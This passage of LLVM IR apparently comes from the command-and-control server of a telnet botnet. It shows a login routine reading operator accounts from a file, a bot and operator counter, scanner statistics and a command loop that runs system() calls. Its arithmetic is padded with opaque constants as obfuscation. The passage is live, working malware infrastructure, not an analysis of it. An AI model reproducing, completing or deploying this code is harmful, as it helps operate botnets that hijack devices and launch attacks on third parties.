  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [2048 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca %struct._IO_FILE*, align 8
  %57 = alloca i64, align 8
  %58 = alloca %struct.tm*, align 8
  %59 = alloca [50 x i8], align 16
  %60 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %61 = load i8*, i8** %3, align 8
  %62 = ptrtoint i8* %61 to i32
  store i32 %62, i32* %4, align 4
  %63 = load volatile i32, i32* @OperatorsConnected, align 4
  %64 = add i32 %63, 1564450593
  %65 = add i32 %64, 1
  %66 = sub i32 %65, 1564450593
  %67 = add nsw i32 %63, 1
  store volatile i32 %66, i32* @OperatorsConnected, align 4
  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 2048, i32 16, i1 false)
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %69, i8 0, i64 2048, i32 16, i1 false)
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 2048, i32 16, i1 false)
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %14, align 4
  %72 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %72, %struct._IO_FILE** %13, align 8
  br label %73

; <label>:73:                                     ; preds = %88, %1
  %74 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %75 = call i32 @feof(%struct._IO_FILE* %74) #7
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = xor i1 true, true
  %82 = and i1 %81, true
  %83 = and i1 true, %79
  %84 = or i1 %78, %80
  %85 = or i1 %82, %83
  %86 = xor i1 %84, %85
  %87 = xor i1 %76, true
  br i1 %86, label %88, label %96

; <label>:88:                                     ; preds = %73
  %89 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %90 = call i32 @fgetc(%struct._IO_FILE* %89)
  store i32 %90, i32* %15, align 4
  %91 = load i32, i32* %14, align 4
  %92 = sub i32 %91, -1303874927
  %93 = add i32 %92, 1
  %94 = add i32 %93, -1303874927
  %95 = add nsw i32 %91, 1
  store i32 %94, i32* %14, align 4
  br label %73

; <label>:96:                                     ; preds = %73
  store i32 0, i32* %16, align 4
  %97 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %97)
  br label %98

; <label>:98:                                     ; preds = %106, %96
  %99 = load i32, i32* %16, align 4
  %100 = load i32, i32* %14, align 4
  %101 = add i32 %100, -1908633200
  %102 = sub i32 %101, 1
  %103 = sub i32 %102, -1908633200
  %104 = sub nsw i32 %100, 1
  %105 = icmp ne i32 %99, %103
  br i1 %105, label %106, label %124

; <label>:106:                                    ; preds = %98
  %107 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %108 = load i32, i32* %16, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.login_info, %struct.login_info* %110, i32 0, i32 0
  %112 = getelementptr inbounds [20 x i8], [20 x i8]* %111, i32 0, i32 0
  %113 = load i32, i32* %16, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.login_info, %struct.login_info* %115, i32 0, i32 1
  %117 = getelementptr inbounds [20 x i8], [20 x i8]* %116, i32 0, i32 0
  %118 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %107, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %112, i8* %117)
  %119 = load i32, i32* %16, align 4
  %120 = add i32 %119, -2087067441
  %121 = add i32 %120, 1
  %122 = sub i32 %121, -2087067441
  %123 = add nsw i32 %119, 1
  store i32 %122, i32* %16, align 4
  br label %98

; <label>:124:                                    ; preds = %98
  %125 = load i32, i32* %4, align 4
  %126 = call i64 @send(i32 %125, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %124
  br label %906

; <label>:129:                                    ; preds = %124
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %131 = load i32, i32* %4, align 4
  %132 = call i32 @fdgets(i8* %130, i32 2048, i32 %131)
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %129
  br label %906

; <label>:135:                                    ; preds = %129
  %136 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %136)
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.login_info, %struct.login_info* %139, i32 0, i32 0
  %141 = getelementptr inbounds [20 x i8], [20 x i8]* %140, i32 0, i32 0
  %142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %143 = call i32 (i8*, i8*, ...) @sprintf(i8* %141, i8* %142) #7
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %144, i8** %17, align 8
  %145 = load i8*, i8** %17, align 8
  %146 = call i32 @Find_Login(i8* %145)
  store i32 %146, i32* %5, align 4
  %147 = load i8*, i8** %17, align 8
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %149
  %151 = getelementptr inbounds %struct.login_info, %struct.login_info* %150, i32 0, i32 0
  %152 = getelementptr inbounds [20 x i8], [20 x i8]* %151, i32 0, i32 0
  %153 = call i32 @strcmp(i8* %147, i8* %152) #8
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %179

; <label>:155:                                    ; preds = %135
  %156 = load i32, i32* %4, align 4
  %157 = call i64 @send(i32 %156, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %158 = icmp eq i64 %157, -1
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %155
  br label %906

; <label>:160:                                    ; preds = %155
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %162 = load i32, i32* %4, align 4
  %163 = call i32 @fdgets(i8* %161, i32 2048, i32 %162)
  %164 = icmp slt i32 %163, 1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %160
  br label %906

; <label>:166:                                    ; preds = %160
  %167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %167)
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %170
  %172 = getelementptr inbounds %struct.login_info, %struct.login_info* %171, i32 0, i32 1
  %173 = getelementptr inbounds [20 x i8], [20 x i8]* %172, i32 0, i32 0
  %174 = call i32 @strcmp(i8* %168, i8* %173) #8
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %166
  br label %180

; <label>:177:                                    ; preds = %166
  %178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 2048, i32 16, i1 false)
  br label %197

; <label>:179:                                    ; preds = %135
  br label %180

; <label>:180:                                    ; preds = %179, %176
  %181 = load i32, i32* %4, align 4
  %182 = call i64 @send(i32 %181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %183 = icmp eq i64 %182, -1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %180
  br label %906

; <label>:185:                                    ; preds = %180
  %186 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %186, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i32 0, i32 0)) #7
  %188 = load i32, i32* %4, align 4
  %189 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %190 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %191 = call i64 @strlen(i8* %190) #8
  %192 = call i64 @send(i32 %188, i8* %189, i64 %191, i32 16384)
  %193 = icmp eq i64 %192, -1
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %185
  br label %906

; <label>:195:                                    ; preds = %185
  %196 = call i32 @sleep(i32 5)
  br label %906

; <label>:197:                                    ; preds = %177
  %198 = load i8*, i8** %3, align 8
  %199 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %198) #7
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 2048, i32 16, i1 false)
  %201 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %202 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.26, i32 0, i32 0)) #7
  %203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %204 = call i32 (i8*, i8*, ...) @sprintf(i8* %203, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.27, i32 0, i32 0)) #7
  %205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %206 = call i32 (i8*, i8*, ...) @sprintf(i8* %205, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.28, i32 0, i32 0)) #7
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %208 = call i32 (i8*, i8*, ...) @sprintf(i8* %207, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.29, i32 0, i32 0)) #7
  %209 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %210 = call i32 (i8*, i8*, ...) @sprintf(i8* %209, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.30, i32 0, i32 0)) #7
  %211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %212 = call i32 (i8*, i8*, ...) @sprintf(i8* %211, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.31, i32 0, i32 0)) #7
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %214 = call i32 (i8*, i8*, ...) @sprintf(i8* %213, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.32, i32 0, i32 0)) #7
  %215 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %217
  %219 = getelementptr inbounds %struct.login_info, %struct.login_info* %218, i32 0, i32 0
  %220 = getelementptr inbounds [20 x i8], [20 x i8]* %219, i32 0, i32 0
  %221 = call i32 (i8*, i8*, ...) @sprintf(i8* %215, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.33, i32 0, i32 0), i8* %220) #7
  %222 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %223 = call i32 @BotsConnected()
  %224 = load volatile i32, i32* @OperatorsConnected, align 4
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %222, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.34, i32 0, i32 0), i32 %223, i32 %224) #7
  %226 = load i32, i32* %4, align 4
  %227 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %228 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %229 = call i64 @strlen(i8* %228) #8
  %230 = call i64 @send(i32 %226, i8* %227, i64 %229, i32 16384)
  %231 = icmp eq i64 %230, -1
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %197
  br label %906

; <label>:233:                                    ; preds = %197
  %234 = load i32, i32* %4, align 4
  %235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %236 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %237 = call i64 @strlen(i8* %236) #8
  %238 = call i64 @send(i32 %234, i8* %235, i64 %237, i32 16384)
  %239 = icmp eq i64 %238, -1
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %233
  br label %906

; <label>:241:                                    ; preds = %233
  %242 = load i32, i32* %4, align 4
  %243 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %244 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %245 = call i64 @strlen(i8* %244) #8
  %246 = call i64 @send(i32 %242, i8* %243, i64 %245, i32 16384)
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %241
  br label %906

; <label>:249:                                    ; preds = %241
  %250 = load i32, i32* %4, align 4
  %251 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %252 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %253 = call i64 @strlen(i8* %252) #8
  %254 = call i64 @send(i32 %250, i8* %251, i64 %253, i32 16384)
  %255 = icmp eq i64 %254, -1
  br i1 %255, label %256, label %257

; <label>:256:                                    ; preds = %249
  br label %906

; <label>:257:                                    ; preds = %249
  %258 = load i32, i32* %4, align 4
  %259 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %260 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %261 = call i64 @strlen(i8* %260) #8
  %262 = call i64 @send(i32 %258, i8* %259, i64 %261, i32 16384)
  %263 = icmp eq i64 %262, -1
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %257
  br label %906

; <label>:265:                                    ; preds = %257
  %266 = load i32, i32* %4, align 4
  %267 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %269 = call i64 @strlen(i8* %268) #8
  %270 = call i64 @send(i32 %266, i8* %267, i64 %269, i32 16384)
  %271 = icmp eq i64 %270, -1
  br i1 %271, label %272, label %273

; <label>:272:                                    ; preds = %265
  br label %906

; <label>:273:                                    ; preds = %265
  %274 = load i32, i32* %4, align 4
  %275 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %276 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %277 = call i64 @strlen(i8* %276) #8
  %278 = call i64 @send(i32 %274, i8* %275, i64 %277, i32 16384)
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %273
  br label %906

; <label>:281:                                    ; preds = %273
  %282 = load i32, i32* %4, align 4
  %283 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %284 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %285 = call i64 @strlen(i8* %284) #8
  %286 = call i64 @send(i32 %282, i8* %283, i64 %285, i32 16384)
  %287 = icmp eq i64 %286, -1
  br i1 %287, label %288, label %289

; <label>:288:                                    ; preds = %281
  br label %906

; <label>:289:                                    ; preds = %281
  br label %290

; <label>:290:                                    ; preds = %289
  %291 = load i32, i32* %4, align 4
  %292 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %294 = call i64 @strlen(i8* %293) #8
  %295 = call i64 @send(i32 %291, i8* %292, i64 %294, i32 16384)
  %296 = icmp eq i64 %295, -1
  br i1 %296, label %297, label %298

; <label>:297:                                    ; preds = %290
  br label %906

; <label>:298:                                    ; preds = %290
  %299 = load i32, i32* %4, align 4
  %300 = call i64 @send(i32 %299, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %301 = icmp eq i64 %300, -1
  br i1 %301, label %302, label %303

; <label>:302:                                    ; preds = %298
  br label %906

; <label>:303:                                    ; preds = %298
  br label %304

; <label>:304:                                    ; preds = %303
  %305 = load i8*, i8** %3, align 8
  %306 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %305) #7
  %307 = load i32, i32* %4, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %308
  %310 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %309, i32 0, i32 0
  store i32 1, i32* %310, align 4
  br label %311

; <label>:311:                                    ; preds = %872, %871, %838, %743, %725, %467, %461, %455, %449, %443, %437, %431, %425, %419, %413, %407, %401, %395, %389, %383, %378, %349, %332, %304
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %313 = load i32, i32* %4, align 4
  %314 = call i32 @fdgets(i8* %312, i32 2048, i32 %313)
  %315 = icmp sgt i32 %314, 0
  br i1 %315, label %316, label %905

; <label>:316:                                    ; preds = %311
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %318 = call i8* @strstr(i8* %317, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %333

; <label>:320:                                    ; preds = %316
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %322 = call i32 @BotsConnected()
  %323 = load volatile i32, i32* @OperatorsConnected, align 4
  %324 = call i32 (i8*, i8*, ...) @sprintf(i8* %321, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %322, i32 %323) #7
  %325 = load i32, i32* %4, align 4
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %328 = call i64 @strlen(i8* %327) #8
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  %330 = icmp eq i64 %329, -1
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %320
  store i8* null, i8** %2, align 8
  br label %918

; <label>:332:                                    ; preds = %320
  br label %311

; <label>:333:                                    ; preds = %316
  %334 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %335 = call i8* @strstr(i8* %334, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0)) #8
  %336 = icmp ne i8* %335, null
  br i1 %336, label %337, label %350

; <label>:337:                                    ; preds = %333
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %339 = load volatile i32, i32* @TELFound, align 4
  %340 = load volatile i32, i32* @scannerreport, align 4
  %341 = call i32 (i8*, i8*, ...) @sprintf(i8* %338, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %339, i32 %340) #7
  %342 = load i32, i32* %4, align 4
  %343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %344 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %345 = call i64 @strlen(i8* %344) #8
  %346 = call i64 @send(i32 %342, i8* %343, i64 %345, i32 16384)
  %347 = icmp eq i64 %346, -1
  br i1 %347, label %348, label %349

; <label>:348:                                    ; preds = %337
  store i8* null, i8** %2, align 8
  br label %918

; <label>:349:                                    ; preds = %337
  br label %311

; <label>:350:                                    ; preds = %333
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %352 = call i8* @strstr(i8* %351, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0)) #8
  %353 = icmp ne i8* %352, null
  br i1 %353, label %354, label %379

; <label>:354:                                    ; preds = %350
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %356 = call i32 @BotsConnected()
  %357 = load volatile i32, i32* @OperatorsConnected, align 4
  %358 = call i32 (i8*, i8*, ...) @sprintf(i8* %355, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %356, i32 %357) #7
  %359 = load i32, i32* %4, align 4
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %362 = call i64 @strlen(i8* %361) #8
  %363 = call i64 @send(i32 %359, i8* %360, i64 %362, i32 16384)
  %364 = icmp eq i64 %363, -1
  br i1 %364, label %365, label %366

; <label>:365:                                    ; preds = %354
  store i8* null, i8** %2, align 8
  br label %918

; <label>:366:                                    ; preds = %354
  %367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %368 = load volatile i32, i32* @TELFound, align 4
  %369 = load volatile i32, i32* @scannerreport, align 4
  %370 = call i32 (i8*, i8*, ...) @sprintf(i8* %367, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %368, i32 %369) #7
  %371 = load i32, i32* %4, align 4
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %374 = call i64 @strlen(i8* %373) #8
  %375 = call i64 @send(i32 %371, i8* %372, i64 %374, i32 16384)
  %376 = icmp eq i64 %375, -1
  br i1 %376, label %377, label %378

; <label>:377:                                    ; preds = %366
  store i8* null, i8** %2, align 8
  br label %918

; <label>:378:                                    ; preds = %366
  br label %311

; <label>:379:                                    ; preds = %350
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %381 = call i8* @strstr(i8* %380, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0)) #8
  %382 = icmp ne i8* %381, null
  br i1 %382, label %383, label %385

; <label>:383:                                    ; preds = %379
  %384 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i32 0, i32 0))
  br label %311

; <label>:385:                                    ; preds = %379
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #8
  %388 = icmp ne i8* %387, null
  br i1 %388, label %389, label %391

; <label>:389:                                    ; preds = %385
  %390 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i32 0, i32 0))
  br label %311

; <label>:391:                                    ; preds = %385
  %392 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %393 = call i8* @strstr(i8* %392, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0)) #8
  %394 = icmp ne i8* %393, null
  br i1 %394, label %395, label %397

; <label>:395:                                    ; preds = %391
  %396 = call i32 @system(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.46, i32 0, i32 0))
  br label %311

; <label>:397:                                    ; preds = %391
  %398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %399 = call i8* @strstr(i8* %398, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0)) #8
  %400 = icmp ne i8* %399, null
  br i1 %400, label %401, label %403

; <label>:401:                                    ; preds = %397
  %402 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.48, i32 0, i32 0))
  br label %311

; <label>:403:                                    ; preds = %397
  %404 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %405 = call i8* @strstr(i8* %404, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i32 0, i32 0)) #8
  %406 = icmp ne i8* %405, null
  br i1 %406, label %407, label %409

; <label>:407:                                    ; preds = %403
  %408 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i32 0, i32 0))
  br label %311

; <label>:409:                                    ; preds = %403
  %410 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %411 = call i8* @strstr(i8* %410, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.51, i32 0, i32 0)) #8
  %412 = icmp ne i8* %411, null
  br i1 %412, label %413, label %415

; <label>:413:                                    ; preds = %409
  %414 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i32 0, i32 0))
  br label %311

; <label>:415:                                    ; preds = %409
  %416 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %417 = call i8* @strstr(i8* %416, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i32 0, i32 0)) #8
  %418 = icmp ne i8* %417, null
  br i1 %418, label %419, label %421

; <label>:419:                                    ; preds = %415
  %420 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.54, i32 0, i32 0))
  br label %311

; <label>:421:                                    ; preds = %415
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %423 = call i8* @strstr(i8* %422, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0)) #8
  %424 = icmp ne i8* %423, null
  br i1 %424, label %425, label %427

; <label>:425:                                    ; preds = %421
  %426 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.56, i32 0, i32 0))
  br label %311

; <label>:427:                                    ; preds = %421
  %428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %429 = call i8* @strstr(i8* %428, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %430 = icmp ne i8* %429, null
  br i1 %430, label %431, label %433

; <label>:431:                                    ; preds = %427
  %432 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.58, i32 0, i32 0))
  br label %311

; <label>:433:                                    ; preds = %427
  %434 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %436 = icmp ne i8* %435, null
  br i1 %436, label %437, label %439

; <label>:437:                                    ; preds = %433
  %438 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i32 0, i32 0))
  br label %311

; <label>:439:                                    ; preds = %433
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %441 = call i8* @strstr(i8* %440, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0)) #8
  %442 = icmp ne i8* %441, null
  br i1 %442, label %443, label %445

; <label>:443:                                    ; preds = %439
  %444 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i32 0, i32 0))
  br label %311

; <label>:445:                                    ; preds = %439
  %446 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %447 = call i8* @strstr(i8* %446, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i32 0, i32 0)) #8
  %448 = icmp ne i8* %447, null
  br i1 %448, label %449, label %451

; <label>:449:                                    ; preds = %445
  %450 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.64, i32 0, i32 0))
  br label %311

